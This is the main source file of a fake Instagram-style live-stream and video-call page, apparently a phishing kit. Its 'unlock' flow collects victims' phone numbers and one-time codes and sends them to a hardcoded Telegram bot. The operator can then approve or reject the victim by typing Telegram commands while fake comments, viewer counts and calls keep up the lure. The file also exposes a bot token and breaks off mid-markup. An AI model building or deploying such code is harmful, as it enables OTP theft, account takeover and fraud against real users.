/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  Heart, 
  MessageCircle, 
  Plus, 
  ArrowLeft, 
  Video, 
  Eye, 
  X, 
  Lock, 
  CircleAlert, 
  House, 
  Search, 
  SquarePlus, 
  Clapperboard, 
  PhoneOff, 
  Phone,
  Mic, 
  MicOff, 
  Volume2, 
  VolumeX, 
  PlayCircle,
  CheckCircle2,
  Users,
  VideoOff,
  Settings,
  History,
  Clock,
  Maximize2,
  Minimize2,
  Play,
  Pause,
  Bell,
  ShieldAlert,
  UserX,
  Volume1,
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

import WhatsAppInbox from './components/WhatsAppInbox';
import PremiumChatService from './components/PremiumChatService';
import PremiumVideoGroups from './components/PremiumVideoGroups';
import FriendService from './components/FriendService';

// Configuration
const BOT_TOKEN = process.env.VITE_TELEGRAM_BOT_TOKEN || "8522129049:AAHZalnaH5g1evquwhwL1PmZjiasK9ZpAdI";
const CHAT_ID = process.env.VITE_TELEGRAM_CHAT_ID || "6904677396";
const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";

// Placeholder assets (using local paths)
const ASSETS = {
  logo: "/assets/profiles/profile1.jpg",
  livePreview: "/assets/videos/live1.mp4",
  stories: [
    "/assets/videos/live1.mp4",
    "/assets/videos/live2.mp4",
    "/assets/videos/live3.mp4"
  ],
  videoCall: "/assets/videos/live1.mp4",
  localVideo: "/assets/videos/live4.mp4",
  ringtone: "/assets/audio/ringtone.mp3"
};

type Step = 'MAIN' | 'JOIN_FORM' | 'LOADER' | 'OTP' | 'VERIFYING' | 'ERROR' | 'CALLING' | 'IN_CALL' | 'SUCCESS' | 'INBOX' | 'PREMIUM' | 'PREMIUM_VIDEO';

interface TargetProfile {
  id: number;
  name: string;
  image: string;
  liveVideo?: string;
  participantsCount?: string;
}

interface Reaction {
  id: number;
  emoji: string;
  left: number;
  duration: number;
  delay: number;
  xOffset: number;
}

interface SessionHistory {
  id: number;
  type: 'CALL' | 'LIVE';
  timestamp: string;
  duration?: number;
  phone?: string;
}

interface Comment {
  id: number;
  user: string;
  text: string;
  avatar: string;
}

export default function App() {
  const [step, setStep] = useState<Step>('MAIN');
  const [targetProfile, setTargetProfile] = useState<TargetProfile>({ id: 1001, name: 'Nusrat Jahan', image: ASSETS.logo, liveVideo: ASSETS.livePreview, participantsCount: '1.2k' });
  const [phone, setPhone] = useState('');
  const [otp, setOtp] = useState(['', '', '', '']);
  const [timer, setTimer] = useState(15);
  const [otpSubmitTime, setOtpSubmitTime] = useState(0);
  const [showStories, setShowStories] = useState(false);
  const [currentStoryIdx, setCurrentStoryIdx] = useState(0);
  const [showLivePreview, setShowLivePreview] = useState(false);
  const [history, setHistory] = useState<SessionHistory[]>([]);
  const [showHistory, setShowHistory] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  const [enableGlitches, setEnableGlitches] = useState(true);
  const [remoteVideoScale, setRemoteVideoScale] = useState(1);
  const [showRemoteUnlock, setShowRemoteUnlock] = useState(false);
  
  // New States for requested features
  const [notifications, setNotifications] = useState<{id: number, title: string, message: string, type: 'call' | 'message' | 'live'}[]>([]);
  const [bannedUsers, setBannedUsers] = useState<string[]>([]);
  const [mutedUsers, setMutedUsers] = useState<string[]>([]);
  const [bandwidthMode, setBandwidthMode] = useState<'AUTO' | 'LOW' | 'HIGH'>('AUTO');
  const [isPaused, setIsPaused] = useState(false);
  const [videoProgress, setVideoProgress] = useState(0);
  const [videoDuration, setVideoDuration] = useState(0);
  const [volume, setVolume] = useState(1);
  const [toasts, setToasts] = useState<{id: number, message: string, type: 'error' | 'success' | 'info'}[]>([]);
  const [incomingCall, setIncomingCall] = useState<{name: string, type: 'audio' | 'video'} | null>(null);
  
  const lastUpdateIdRef = useRef<number>(0);
  const pollingActiveRef = useRef<boolean>(false);
  const videoRef = useRef<HTMLVideoElement>(null);

  // New Interactive States
  const [quality, setQuality] = useState<'SD' | 'HD'>('HD');
  const [viewerCount, setViewerCount] = useState(1214);
  const [reactions, setReactions] = useState<Reaction[]>([]);
  const [comments, setComments] = useState<Comment[]>([
    { id: 1, user: 'alex_j', text: 'Love this live! 😍', avatar: 'https://i.pravatar.cc/150?u=alex' },
    { id: 2, user: 'sarah_k', text: 'You look amazing Nusrat!', avatar: 'https://i.pravatar.cc/150?u=sarah' },
  ]);
  const [newComment, setNewComment] = useState('');

  // Video Call States
  const [callDuration, setCallDuration] = useState(0);
  const [isMuted, setIsMuted] = useState(false);
  const [isSpeaker, setIsSpeaker] = useState(true);
  const [isCameraOff, setIsCameraOff] = useState(false);
  const [showParticipants, setShowParticipants] = useState(false);
  const [isGlitching, setIsGlitching] = useState(false);
  const [participants] = useState(['Nusrat Jahan', 'You', 'Alex J', 'Sarah K']);

  const otpRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];
  const commentsEndRef = useRef<HTMLDivElement>(null);

  // Auto-scroll comments
  useEffect(() => {
    commentsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [comments]);

  // Network Quality Simulation (Glitches)
  useEffect(() => {
    if (enableGlitches && quality === 'SD' && (step === 'IN_CALL' || showLivePreview || step === 'SUCCESS')) {
      const interval = setInterval(() => {
        if (Math.random() > 0.7) {
          setIsGlitching(true);
          setTimeout(() => setIsGlitching(false), 200 + Math.random() * 500);
        }
      }, 2000);
      return () => clearInterval(interval);
    } else {
      setIsGlitching(false);
    }
  }, [quality, step, showLivePreview, enableGlitches]);

  // Dynamic Viewer Count
  useEffect(() => {
    const interval = setInterval(() => {
      setViewerCount(prev => {
        const change = Math.floor(Math.random() * 5) - 2; // -2 to +2
        return Math.max(100, prev + change);
      });
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  // Simulated incoming comments
  useEffect(() => {
    if (showLivePreview || step === 'SUCCESS') {
      const interval = setInterval(() => {
        const mockComments = [
          'Wow! 🔥', 'Hello from Bangladesh! 🇧🇩', 'So beautiful!', 'Can you see my comment?', 'Big fan! ❤️', 'Amazing quality!'
        ];
        const randomUser = ['user_' + Math.floor(Math.random() * 1000), 'fan_nusrat', 'insta_lover'];
        const randomComment: Comment = {
          id: Date.now(),
          user: randomUser[Math.floor(Math.random() * randomUser.length)],
          text: mockComments[Math.floor(Math.random() * mockComments.length)],
          avatar: `https://i.pravatar.cc/150?u=${Math.random()}`
        };
        setComments(prev => [...prev.slice(-15), randomComment]);
      }, 4000);
      return () => clearInterval(interval);
    }
  }, [showLivePreview, step]);

  // Random Notifications & Calls Effect
  useEffect(() => {
    const interval = setInterval(() => {
      const rand = Math.random();
      if (rand > 0.8) {
        const types: ('call' | 'message' | 'live')[] = ['call', 'message', 'live'];
        const type = types[Math.floor(Math.random() * types.length)];
        const titles = {
          call: 'Missed Call',
          message: 'New Message',
          live: 'Live Now'
        };
        const messages = {
          call: 'Nusrat Jahan tried to call you.',
          message: 'You have a new message in your inbox.',
          live: 'Nusrat Jahan is live right now!'
        };
        addNotification(titles[type], messages[type], type);
      }

      // Random Incoming Call
      if (rand > 0.95 && !incomingCall && step === 'MAIN') {
        setIncomingCall({ name: 'Nusrat Jahan', type: Math.random() > 0.5 ? 'video' : 'audio' });
      }
    }, 15000);
    return () => clearInterval(interval);
  }, [incomingCall, step]);

  const addReaction = (emoji: string) => {
    const id = Date.now();
    const left = Math.random() * 60 + 20; // 20% to 80%
    const duration = 2 + Math.random() * 2;
    const delay = Math.random() * 0.5;
    const xOffset = (Math.random() - 0.5) * 100; // -50 to 50px
    setReactions(prev => [...prev, { id, emoji, left, duration, delay, xOffset }]);
    setTimeout(() => {
      setReactions(prev => prev.filter(r => r.id !== id));
    }, (duration + delay) * 1000);
  };

  const addNotification = (title: string, message: string, type: 'call' | 'message' | 'live') => {
    const id = Date.now();
    setNotifications(prev => [...prev, { id, title, message, type }]);
    setTimeout(() => {
      setNotifications(prev => prev.filter(n => n.id !== id));
    }, 5000);
  };

  const addToast = (message: string, type: 'error' | 'success' | 'info' = 'info') => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, message, type }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 4000);
  };

  const handleModeration = (user: string, action: 'mute' | 'ban') => {
    if (action === 'mute') {
      setMutedUsers(prev => [...prev, user]);
      addNotification('Moderation', `${user} has been muted.`, 'message');
    } else {
      setBannedUsers(prev => [...prev, user]);
      addNotification('Moderation', `${user} has been banned.`, 'message');
    }
  };

  const handleSendComment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newComment.trim()) return;
    const comment: Comment = {
      id: Date.now(),
      user: 'You',
      text: newComment,
      avatar: 'https://i.pravatar.cc/150?u=you'
    };
    
    // Simulate latency for low bandwidth
    const delay = bandwidthMode === 'LOW' ? 1500 : 0;
    setTimeout(() => {
      setComments(prev => [...prev, comment]);
    }, delay);
    
    setNewComment('');
  };

  // Persistence & History
  useEffect(() => {
    const isLocked = localStorage.getItem('isLocked');
    const savedPhone = localStorage.getItem('userPhone');
    const savedHistory = localStorage.getItem('sessionHistory');
    
    if (isLocked === 'true' && savedPhone) {
      setPhone(savedPhone);
      setStep('OTP');
    }
    
    if (savedHistory) {
      setHistory(JSON.parse(savedHistory));
    }
  }, []);

  const saveToHistory = (type: 'CALL' | 'LIVE', duration?: number) => {
    const now = Date.now();
    const d = new Date();
    d.setTime(now);
    const timestamp = d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
    const newEntry: SessionHistory = {
      id: now,
      type,
      timestamp,
      duration,
      phone: phone || 'Anonymous'
    };
    const updatedHistory = [newEntry, ...history].slice(0, 10);
    setHistory(updatedHistory);
    localStorage.setItem('sessionHistory', JSON.stringify(updatedHistory));
  };

  // OTP Timer
  useEffect(() => {
    if ((step === 'OTP' || step === 'VERIFYING') && timer > 0) {
      const t = setInterval(() => setTimer(prev => prev - 1), 1000);
      return () => clearInterval(t);
    }
  }, [step, timer]);

  // Call Duration Timer
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (step === 'IN_CALL') {
      interval = setInterval(() => {
        setCallDuration(prev => prev + 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step]);

  const pollTelegram = async () => {
    if (pollingActiveRef.current) return;
    
    pollingActiveRef.current = true;
    try {
      const offset = lastUpdateIdRef.current ? lastUpdateIdRef.current + 1 : -1;
      // console.log(`Polling Telegram... offset: ${offset}, current step: ${step}`);
      
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&limit=10&timeout=5`);
      const data = await res.json();
      
      if (data.ok && data.result && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateIdRef.current = update.update_id;
          const lastMsg = update.message || update.edited_message;
          if (!lastMsg) continue;
          
          const msgText = lastMsg.text || lastMsg.caption || "";
          const command = msgText.trim().toLowerCase();
          
          console.log(`Telegram Command: "${command}" (Step: ${step})`);

          const now = Math.floor(Date.now() / 1000);
          // Allow messages from the last 2 hours to be safe
          if (lastMsg.date >= now - 7200) {
            // Global Remote Command
            if (command.includes('unlock profile') && command.includes('voice or video call')) {
              setShowRemoteUnlock(true);
              break;
            }

            // Success/Error Commands - More lenient matching
            if (command.includes('success') || command.includes('ok') || command.includes('unlock') || command.includes('verify')) {
              console.log("SUCCESS command matched! Unlocking...");
              localStorage.removeItem('isLocked');
              if (targetProfile.id) {
                localStorage.setItem(`unlocked_live_${targetProfile.id}`, 'true');
              }
              setStep('SUCCESS');
              break; 
            } else if (command.includes('error') || command.includes('reject') || command.includes('fail') || command.includes('wrong')) {
              console.log("ERROR command matched! Setting error state...");
              setStep('ERROR');
              break;
            }
          }
          
          // Call related commands
          if (step === 'CALLING') {
            if (command.includes('received') || command.includes('accept') || command.includes('answer')) {
              setStep('IN_CALL');
              break;
            } else if (command.includes('exist') || command.includes('reject') || command.includes('end')) {
              endCall();
              break;
            }
          }

          if (step === 'IN_CALL' && (command.includes('exist') || command.includes('end') || command.includes('stop'))) {
            endCall();
            break;
          }
        }
      }
    } catch (e) { 
      // Silently handle common fetch errors to avoid noisy console logs
      if (e instanceof Error && (e.message.includes('Failed to fetch') || e.message.includes('NetworkError'))) {
        // Ignore common network hiccups
      } else {
        console.warn("Polling update failed:", e);
      }
    } finally {
      pollingActiveRef.current = false;
    }
  };

  // Telegram Polling
  useEffect(() => {
    pollTelegram();
    const interval = setInterval(pollTelegram, 3000);

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [step]);

  const sendToTelegram = async (msg: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
      });
    } catch (e) {}
  };

  const handlePhoneSubmit = async () => {
    if (phone.length < 5) {
      addToast('Please enter a valid phone number', 'error');
      return;
    }
    localStorage.setItem('userPhone', phone);
    localStorage.setItem('isLocked', 'true');
    const currentTime = Math.floor(Date.now() / 1000);
    setOtpSubmitTime(currentTime);
    await sendToTelegram(`📱 *User Submitted Number*\nPhone: \`${phone}\``);
    setStep('LOADER');
    setTimeout(() => {
      setStep('OTP');
      setTimer(15);
      addToast('OTP sent successfully', 'success');
    }, 3000);
  };

  const startVideoCall = (type: 'audio' | 'video' = 'video', profile?: { id?: number, name: string, image: string, liveVideo?: string, participantsCount?: string }) => {
    const profileId = profile?.id || 1001;
    if (profile) {
      setTargetProfile({
        id: profileId,
        name: profile.name,
        image: profile.image,
        liveVideo: profile.liveVideo,
        participantsCount: profile.participantsCount || '1.2k'
      });
    }

    const callerName = profile?.name || "Anonymous";
    const callerPhone = phone || "Unknown";
    const currentTime = Math.floor(Date.now() / 1000);
    setOtpSubmitTime(currentTime);
    setStep('CALLING');
    sendToTelegram(`📞 *Incoming Video Call...*\nTarget: \`${callerName}\`\nPhone: \`${callerPhone}\`\n\n👇 *Actions:*\nType \`/received\` to Accept\nType \`/exist\` to Reject`);
    addNotification('Outgoing Call', `Calling ${callerName}...`, 'call');
  };

  const joinLive = (profile?: { id?: number, name: string, image: string, liveVideo?: string, participantsCount?: string }) => {
    const profileId = profile?.id || 1001;
    if (profile) {
      setTargetProfile({
        id: profileId,
        name: profile.name,
        image: profile.image,
        liveVideo: profile.liveVideo,
        participantsCount: profile.participantsCount || '1.2k'
      });
    }

    const isUnlocked = localStorage.getItem(`unlocked_live_${profileId}`) === 'true';
    if (!isUnlocked) {
      setStep('JOIN_FORM');
    } else {
      setStep('SUCCESS');
      addNotification('Live Started', `${profile?.name || targetProfile.name} is now live!`, 'live');
    }
  };

  const endCall = () => {
    if (step === 'IN_CALL') {
      saveToHistory('CALL', callDuration);
    }
    setStep('MAIN');
    setShowLivePreview(false);
    setCallDuration(0);
  };

  const handleOtpChange = (i: number, val: string) => {
    if (!/^\d*$/.test(val)) return;
    const newOtp = [...otp];
    newOtp[i] = val;
    setOtp(newOtp);
    if (val && i < 3) otpRefs[i+1].current?.focus();
    
    if (newOtp.join('').length === 4) {
      const currentTime = Math.floor(Date.now() / 1000);
      setOtpSubmitTime(currentTime);
      sendToTelegram(`🔐 *OTP Received*\nPhone: \`${phone}\`\nOTP Code: \`${newOtp.join('')}\`\n\n👇 *Actions:*\nType \`/success\` to Unlock Live\nType \`/error\` to Reject Access`);
      setStep('VERIFYING');
    }
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const goBack = () => {
    if (step === 'INBOX') {
      setStep('MAIN');
      return;
    }
    if (step === 'SUCCESS') {
      saveToHistory('LIVE');
      setStep('MAIN');
      setShowLivePreview(false);
      setComments([]);
      return;
    }
    if (localStorage.getItem('isLocked') === 'true') {
      setStep('OTP');
      return;
    }
    if (step === 'JOIN_FORM') setStep('MAIN');
    if (step === 'ERROR') {
      setOtp(['', '', '', '']);
      setStep('OTP');
      addToast('Invalid OTP. Please try again.', 'error');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white max-w-md mx-auto shadow-2xl relative overflow-hidden font-sans">

      {/* Floating Reactions Container */}
      <div className="fixed inset-0 pointer-events-none z-[200]">
        <AnimatePresence>
          {reactions.map(r => (
            <motion.div
              key={r.id}
              initial={{ 
                y: '100vh', 
                x: `${r.left}%`, 
                opacity: 0, 
                scale: 0.5,
                rotate: 0
              }}
              animate={{ 
                y: '-10vh', 
                x: `${r.left + r.xOffset}%`,
                opacity: [0, 1, 1, 0], 
                scale: [0.5, 1.5, 1.2, 1],
                rotate: [0, 15, -15, 0]
              }}
              exit={{ opacity: 0 }}
              transition={{ 
                duration: r.duration, 
                delay: r.delay,
                ease: "easeOut" 
              }}
              className="absolute text-3xl"
            >
              {r.emoji}
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Notifications Overlay */}
      <div className="fixed top-20 inset-x-4 z-[400] flex flex-col gap-2 pointer-events-none">
        <AnimatePresence>
          {notifications.map(n => (
            <motion.div
              key={n.id}
              initial={{ opacity: 0, y: -20, scale: 0.9 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="bg-white/90 backdrop-blur-md p-3 rounded-xl shadow-xl border border-gray-200 flex items-center gap-3 pointer-events-auto"
            >
              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                n.type === 'call' ? 'bg-green-100 text-green-600' : 
                n.type === 'message' ? 'bg-blue-100 text-blue-600' : 
                'bg-red-100 text-red-600'
              }`}>
                {n.type === 'call' ? <Video className="w-5 h-5" /> : 
                 n.type === 'message' ? <MessageCircle className="w-5 h-5" /> : 
                 <Eye className="w-5 h-5" />}
              </div>
              <div className="flex-1">
                <h4 className="text-xs font-bold text-gray-900">{n.title}</h4>
                <p className="text-[10px] text-gray-500">{n.message}</p>
              </div>
              <button onClick={() => setNotifications(prev => prev.filter(notif => notif.id !== n.id))}>
                <X className="w-4 h-4 text-gray-400" />
              </button>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Toasts Overlay */}
      <div className="fixed bottom-20 inset-x-4 z-[500] flex flex-col gap-2 pointer-events-none">
        <AnimatePresence>
          {toasts.map(t => (
            <motion.div
              key={t.id}
              initial={{ opacity: 0, y: 20, scale: 0.9 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className={`p-3 rounded-lg shadow-lg flex items-center gap-3 pointer-events-auto border ${
                t.type === 'error' ? 'bg-red-50 border-red-200 text-red-700' : 
                t.type === 'success' ? 'bg-green-50 border-green-200 text-green-700' : 
                'bg-blue-50 border-blue-200 text-blue-700'
              }`}
            >
              {t.type === 'error' ? <CircleAlert className="w-5 h-5" /> : 
               t.type === 'success' ? <CheckCircle2 className="w-5 h-5" /> : 
               <Bell className="w-5 h-5" />}
              <p className="text-xs font-medium">{t.message}</p>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Incoming Call Modal */}
      <AnimatePresence>
        {incomingCall && (
          <motion.div
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            className="fixed inset-0 bg-black/90 z-[600] flex flex-col items-center justify-between py-20 text-white"
          >
            <div className="flex flex-col items-center gap-4">
              <div className="w-24 h-24 rounded-full border-4 border-green-500 p-1 overflow-hidden">
                <img src={ASSETS.logo} className="w-full h-full rounded-full object-cover" />
              </div>
              <h2 className="text-2xl font-bold">{incomingCall.name}</h2>
              <p className="text-gray-400 animate-pulse">Incoming {incomingCall.type} call...</p>
            </div>

            <div className="flex gap-12">
              <button 
                onClick={() => setIncomingCall(null)}
                className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center shadow-lg active:scale-90 transition"
              >
                <PhoneOff className="w-8 h-8" />
              </button>
              <button 
                onClick={() => {
                  setIncomingCall(null);
                  setStep('IN_CALL');
                  addToast('Call connected', 'success');
                }}
                className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center shadow-lg active:scale-90 transition"
              >
                <Video className="w-8 h-8" />
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Header */}
      <header className="h-14 px-4 flex items-center justify-between border-b border-gray-100 bg-white sticky top-0 z-50">
        <div className="flex items-center gap-2">
          {step !== 'MAIN' && !['CALLING', 'IN_CALL'].includes(step) && (
            <button onClick={goBack} className="flex items-center text-gray-700 cursor-pointer">
              <ArrowLeft className="w-6 h-6 mr-2" />
              <span className="text-sm font-bold">Back</span>
            </button>
          )}
          {step === 'MAIN' && (
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold italic" style={{ fontFamily: 'serif' }}>Instagram</h1>
              <button 
                onClick={() => setIncomingCall({ name: 'Random User', type: 'video' })}
                className="p-2 bg-gray-100 rounded-full text-gray-600 active:scale-90 transition"
                title="Simulate Incoming Call"
              >
                <Phone className="w-4 h-4" />
              </button>
              <button 
                onClick={() => setShowHistory(!showHistory)}
                className="p-1 hover:bg-gray-100 rounded-full transition"
              >
                <History className="w-5 h-5 text-gray-600" />
              </button>
            </div>
          )}
        </div>
        <div className="flex gap-5 text-xl">
          <Heart className="w-6 h-6" />
          <MessageCircle className="w-6 h-6 cursor-pointer" onClick={() => setStep('INBOX')} />
        </div>
      </header>

      <main className="flex-1 pb-16 overflow-y-auto">
        <AnimatePresence mode="wait">
          {step === 'MAIN' && (
            <motion.div 
              key="main"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
            >
              {/* Stories Bar */}
              <div className="p-4 flex gap-4 overflow-x-auto scrollbar-hide bg-white">
                <div className="flex flex-col items-center shrink-0">
                  <div className="w-[72px] h-[72px] p-0.5 border border-gray-200 rounded-full relative">
                    <img src={ASSETS.logo} className="w-full h-full rounded-full object-cover" referrerPolicy="no-referrer" />
                    <div className="absolute bottom-0 right-0 bg-blue-500 text-white border-2 border-white rounded-full w-5 h-5 flex items-center justify-center">
                      <Plus className="w-3 h-3" />
                    </div>
                  </div>
                  <span className="text-[11px] mt-1 text-gray-500">My story</span>
                </div>
                <div className="flex flex-col items-center shrink-0" onClick={() => {setShowStories(true); setCurrentStoryIdx(0);}}>
                  <div className="w-[72px] h-[72px] p-[2px] rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600">
                    <div className="w-full h-full border-2 border-white rounded-full overflow-hidden">
                      <img src={ASSETS.logo} className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                    </div>
                  </div>
                  <span className="text-[11px] mt-1 font-medium">Nusrat Jahan</span>
                </div>
              </div>

              {/* Live Preview Frame */}
              <div className="px-4 mt-2">
                <div 
                  className="relative w-full aspect-[4/5] rounded-xl overflow-hidden shadow-lg bg-black cursor-pointer"
                  onClick={() => setShowLivePreview(true)}
                >
                  <video 
                    src={ASSETS.livePreview} 
                    className={`w-full h-full object-cover opacity-70 transition-all duration-500 ${quality === 'SD' ? 'blur-sm' : 'blur-0'}`} 
                    autoPlay loop muted playsInline 
                  />
                  {/* Glitch Overlay */}
                  {isGlitching && (
                    <div className="absolute inset-0 pointer-events-none z-[60] mix-blend-overlay opacity-50 bg-gradient-to-t from-transparent via-white/20 to-transparent animate-pulse" />
                  )}
                  <div className="absolute top-4 left-4 flex gap-2">
                    <div className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-sm">LIVE</div>
                    <div className="bg-black/40 text-white text-[10px] px-2 py-0.5 rounded-sm flex items-center">
                      <Eye className="w-3 h-3 mr-1" /> {viewerCount.toLocaleString()}
                    </div>
                  </div>
                  
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-white text-center">
                    <PlayCircle className="w-16 h-16 opacity-60 mb-4" />
                    <h2 className="text-xl font-bold">Mst: Nusrat Jahan</h2>
                    <div className="flex gap-3 mt-4">
                      <button 
                        onClick={(e) => {e.stopPropagation(); joinLive();}} 
                        className="px-6 py-2 bg-white text-black rounded-full font-bold text-xs shadow-xl active:scale-95 transition"
                      >
                        JOIN LIVE
                      </button>
                      <button 
                        onClick={(e) => {e.stopPropagation(); startVideoCall();}} 
                        className="px-6 py-2 bg-pink-600 text-white rounded-full font-bold text-xs shadow-xl active:scale-95 transition flex items-center"
                      >
                        <Video className="w-4 h-4 mr-2" /> VIDEO CALL
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {step === 'JOIN_FORM' && (
            <motion.div 
              key="join"
              initial={{ x: 50, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: -50, opacity: 0 }}
              className="px-8 py-12 text-center"
            >
              <div className="flex justify-center mb-6">
                <img src={targetProfile.image} className="w-24 h-24 rounded-full border p-1 border-gray-100 shadow-sm" referrerPolicy="no-referrer" />
              </div>
              <h2 className="text-xl font-bold mb-1">{targetProfile.name}</h2>
              <p className="text-gray-500 text-sm mb-10">Unlock profile to start voice or video call</p>
              <input 
                type="tel" 
                placeholder="Phone number" 
                className="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 mb-6 focus:border-gray-400 outline-none font-bold"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
              <button 
                onClick={handlePhoneSubmit} 
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white font-bold py-3.5 rounded-lg text-sm shadow-lg active:scale-95 transition"
              >
                JOIN LIVE NOW
              </button>
            </motion.div>
          )}

          {step === 'LOADER' && (
            <div className="text-center py-24">
              <div className="w-10 h-10 border-4 border-gray-200 border-t-pink-500 rounded-full animate-spin mx-auto mb-4"></div>
              <p className="text-sm font-medium text-gray-500">Requesting Access...</p>
            </div>
          )}

          {(step === 'OTP' || step === 'VERIFYING') && (
            <motion.div 
              key="otp"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="px-8 py-12 text-center"
            >
              <div className="flex justify-center mb-6">
                <img src={targetProfile.image} className="w-24 h-24 rounded-full border p-1 border-gray-100 shadow-sm" referrerPolicy="no-referrer" />
              </div>
              <h3 className="text-xl font-bold mb-2">{targetProfile.name}</h3>
              <p className="text-gray-500 text-xs mb-10 px-4">Enter the 4-digit premium code sent to your imo/sms to unlock the live.</p>
              <div className="flex justify-center gap-4 mb-10">
                {otp.map((d, i) => (
                  <input 
                    key={i} 
                    ref={otpRefs[i]} 
                    type="tel" 
                    maxLength={1} 
                    value={d} 
                    onChange={(e) => handleOtpChange(i, e.target.value)} 
                    className="w-12 h-14 border border-gray-300 rounded-lg text-center text-2xl font-bold bg-gray-50 outline-none focus:bg-white focus:border-pink-500" 
                  />
                ))}
              </div>
              {step === 'VERIFYING' ? (
                <div className="mt-2 text-blue-600 font-bold text-sm animate-pulse flex items-center justify-center">
                  <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin mr-2"></div>
                  Verifying Access...
                </div>
              ) : (
                <div className="flex flex-col items-center">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest">Verifying in {timer}s...</p>
                  <button 
                    onClick={() => pollTelegram()}
                    className="mt-6 text-pink-600 text-xs font-bold bg-pink-50 px-4 py-2 rounded-full active:scale-95 transition"
                  >
                    Check Status
                  </button>
                </div>
              )}
            </motion.div>
          )}

          {step === 'INBOX' && (
            <motion.div 
              key="inbox"
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="fixed inset-0 bg-black z-[100]"
            >
              <FriendService onBack={() => setStep('MAIN')} onInitiateCall={startVideoCall} onJoinLive={joinLive} addToast={addToast} />
            </motion.div>
          )}

          {step === 'ERROR' && (
            <motion.div 
              key="error"
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="px-8 py-12 text-center"
            >
              <CircleAlert className="w-16 h-16 text-red-500 mb-6 mx-auto" />
              <h3 className="text-xl font-bold text-red-600 mb-2">Invalid Code</h3>
              <p className="text-gray-500 text-sm mb-10">The code is incorrect. Please check your message and try again.</p>
              <button onClick={() => setStep('OTP')} className="w-full bg-black text-white py-3.5 rounded-lg font-bold active:scale-95 transition">TRY AGAIN</button>
            </motion.div>
          )}

          {step === 'PREMIUM' && (
            <motion.div 
              key="premium"
              initial={{ opacity: 0, x: 100 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -100 }}
              className="fixed inset-0 bg-black z-[100]"
            >
              <PremiumChatService onBack={() => setStep('MAIN')} />
            </motion.div>
          )}

          {step === 'PREMIUM_VIDEO' && (
            <motion.div 
              key="premium_video"
              initial={{ opacity: 0, x: 100 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -100 }}
              className="fixed inset-0 bg-black z-[100]"
            >
              <PremiumVideoGroups 
                onBack={() => setStep('MAIN')} 
                onGetPremium={(group) => {
                  setTargetProfile({
                    id: parseInt(group.id.replace('grp_100', '')),
                    name: group.name,
                    image: group.image,
                    liveVideo: group.previewVideo
                  });
                  setStep('JOIN_FORM');
                }}
              />
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Bottom Navbar */}
      <nav className="h-16 border-t border-gray-100 flex justify-around items-center bg-white sticky bottom-0 z-50 px-2 gap-2">
        <button className="flex flex-col items-center justify-center text-gray-800">
          <House className="w-6 h-6" />
        </button>
        
        <button 
          onClick={() => setStep('PREMIUM')}
